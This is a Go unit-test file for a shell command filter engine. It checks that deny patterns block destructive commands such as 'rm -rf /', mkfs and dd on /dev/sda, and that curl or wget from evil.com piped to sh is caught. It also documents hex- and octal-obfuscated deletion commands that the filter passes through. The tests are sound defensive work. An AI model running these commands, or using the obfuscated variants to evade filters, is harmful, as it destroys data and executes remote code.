package filter

import (
	"sync"
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestFilterEngine_BlocksExactMatch(t *testing.T) {
	e := NewFilterEngine([]string{"rm -rf /"})
	d := e.Inspect("rm -rf /")
	assert.True(t, d.Block)
	assert.Equal(t, "rm -rf /", d.Reason)
}

func TestFilterEngine_BlocksSubstring(t *testing.T) {
	// Pattern is a substring of the command
	e := NewFilterEngine([]string{"rm -rf /"})
	d := e.Inspect("sudo rm -rf / --no-preserve-root")
	assert.True(t, d.Block)
}

func TestFilterEngine_AllowsSafeCommand(t *testing.T) {
	e := NewFilterEngine([]string{"rm -rf /"})
	d := e.Inspect("ls -la")
	assert.False(t, d.Block)
	assert.Empty(t, d.Reason)
}

func TestFilterEngine_AllowsSimilarButSafeCommand(t *testing.T) {
	// "rm -rf /tmp/cache" DOES contain "rm -rf /" as substring — correctly blocked.
	// Admins who want to allow specific subpaths should use more precise patterns,
	// e.g. "rm -rf / " (trailing space) instead of "rm -rf /".
	e := NewFilterEngine([]string{"rm -rf /"})
	d := e.Inspect("rm -rf /tmp/cache")
	assert.True(t, d.Block)
}

func TestFilterEngine_CaseInsensitive(t *testing.T) {
	e := NewFilterEngine([]string{"mkfs"})
	assert.True(t, e.Inspect("MKFS /dev/sda").Block)
	assert.True(t, e.Inspect("Mkfs.ext4 /dev/sda").Block)
}

func TestFilterEngine_MultiplePatterns(t *testing.T) {
	e := NewFilterEngine([]string{"rm -rf /", "mkfs", "dd if=/dev/zero"})
	assert.True(t, e.Inspect("mkfs.ext4 /dev/sda").Block)
	assert.True(t, e.Inspect("dd if=/dev/zero of=/dev/sda").Block)
	assert.False(t, e.Inspect("echo hello").Block)
}

func TestFilterEngine_EmptyInput(t *testing.T) {
	e := NewFilterEngine([]string{"rm -rf /"})
	d := e.Inspect("")
	assert.False(t, d.Block)
}

func TestFilterEngine_EmptyPatterns(t *testing.T) {
	e := NewFilterEngine([]string{})
	d := e.Inspect("rm -rf /")
	assert.False(t, d.Block)
}

func TestFilterEngine_Reload(t *testing.T) {
	e := NewFilterEngine([]string{"rm -rf /"})
	assert.False(t, e.Inspect("mkfs /dev/sda").Block)

	e.Reload([]string{"mkfs"})
	assert.True(t, e.Inspect("mkfs /dev/sda").Block)
	// old pattern no longer active
	assert.False(t, e.Inspect("rm -rf /").Block)
}

func TestFilterEngine_ReasonContainsPattern(t *testing.T) {
	e := NewFilterEngine([]string{"rm -rf /", "mkfs"})
	d := e.Inspect("mkfs.ext4 /dev/sda")
	assert.True(t, d.Block)
	assert.Equal(t, "mkfs", d.Reason)
}

// =============================================================================
// Case 5 — embedded command in interpreter argument (plain text variant)
// =============================================================================

func TestFilterEngine_BlocksPythonWithEmbeddedCommand(t *testing.T) {
	// python -c "... os.system('rm -rf /')" — rm -rf / is visible in plain text,
	// VTE passes it through unchanged, FilterEngine must catch it.
	e := NewFilterEngine([]string{"rm -rf /"})
	d := e.Inspect(`python -c "import os; os.system('rm -rf /')"`)
	assert.True(t, d.Block)
	assert.Equal(t, "rm -rf /", d.Reason)
}

func TestFilterEngine_BlocksPerlWithEmbeddedCommand(t *testing.T) {
	e := NewFilterEngine([]string{"rm -rf /"})
	d := e.Inspect(`perl -e 'system("rm -rf /")'`)
	assert.True(t, d.Block)
	assert.Equal(t, "rm -rf /", d.Reason)
}

func TestFilterEngine_DoesNotBlockEncodedPython(t *testing.T) {
	// Language-level hex encoding (\x72\x6d...) is NOT decoded by VTE —
	// VTE operates on terminal escape sequences, not Python string literals.
	// Encoded variants are handled by the AI analyzer (TBAS-501) and
	// eBPF agent (TBAS-603).
	e := NewFilterEngine([]string{"rm -rf /"})
	d := e.Inspect(`python -c "import os; os.system('\x72\x6d\x20\x2d\x72\x66\x20\x2f')"`)
	assert.False(t, d.Block)
}

// =============================================================================
// Case 8 — piped shell execution
// =============================================================================

func TestFilterEngine_BlocksWgetPipedToBash(t *testing.T) {
	e := NewFilterEngine([]string{"| bash", "| sh"})
	d := e.Inspect("wget http://evil.com/script.sh | bash")
	assert.True(t, d.Block)
	assert.Equal(t, "| bash", d.Reason)
}

func TestFilterEngine_BlocksCurlPipedToSh(t *testing.T) {
	e := NewFilterEngine([]string{"| bash", "| sh"})
	d := e.Inspect("curl http://evil.com/script.sh | sh")
	assert.True(t, d.Block)
	assert.Equal(t, "| sh", d.Reason)
}

func TestFilterEngine_AllowsSafePipe(t *testing.T) {
	// Legitimate pipes must not be blocked.
	e := NewFilterEngine([]string{"| bash", "| sh"})
	assert.False(t, e.Inspect("echo hello | grep hello").Block)
	assert.False(t, e.Inspect("cat /etc/hosts | sort").Block)
}

// =============================================================================
// Boundary documentation — shell obfuscation is out of scope
// =============================================================================

func TestFilterEngine_DoesNotDecodeShellObfuscation(t *testing.T) {
	// FilterEngine operates on VTE-decoded visible text only.
	// Shell-level obfuscation (eval, hex encoding, base64) is NOT
	// in scope here — that is handled by the AI analyzer (TBAS-501)
	// and eBPF agent (TBAS-603).
	e := NewFilterEngine([]string{"rm -rf /"})

	shellObfuscated := []string{
		`eval $'\162\155\040\055\162\146\040\57'`,
		`eval "$(printf "\x72\x6d\x20\x2d\x72\x66\x20\x2f")"`,
		`perl -e 'system pack "H*", "726d202d7266202f"'`,
	}
	for _, cmd := range shellObfuscated {
		d := e.Inspect(cmd)
		assert.False(t, d.Block, "expected pass-through for shell-obfuscated: %s", cmd)
	}
}

// =============================================================================
// Concurrency
// =============================================================================

func TestFilterEngine_ConcurrentReloadInspect(t *testing.T) {
	e := NewFilterEngine([]string{"rm -rf /"})
	var wg sync.WaitGroup
	for i := 0; i < 100; i++ {
		wg.Add(2)
		go func() { defer wg.Done(); e.Inspect("rm -rf /") }()
		go func() { defer wg.Done(); e.Reload([]string{"mkfs"}) }()
	}
	wg.Wait()
}

// =============================================================================
// Benchmark — 1000 patterns, 1KB input must complete in < 1ms
// =============================================================================

func BenchmarkFilterEngine_1000Patterns(b *testing.B) {
	patterns := make([]string, 1000)
	for i := range patterns {
		patterns[i] = "pattern_that_does_not_match_" + string(rune('a'+i%26))
	}
	patterns[999] = "rm -rf /"

	e := NewFilterEngine(patterns)
	input := string(make([]byte, 1024)) + "rm -rf /"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		e.Inspect(input)
	}
}
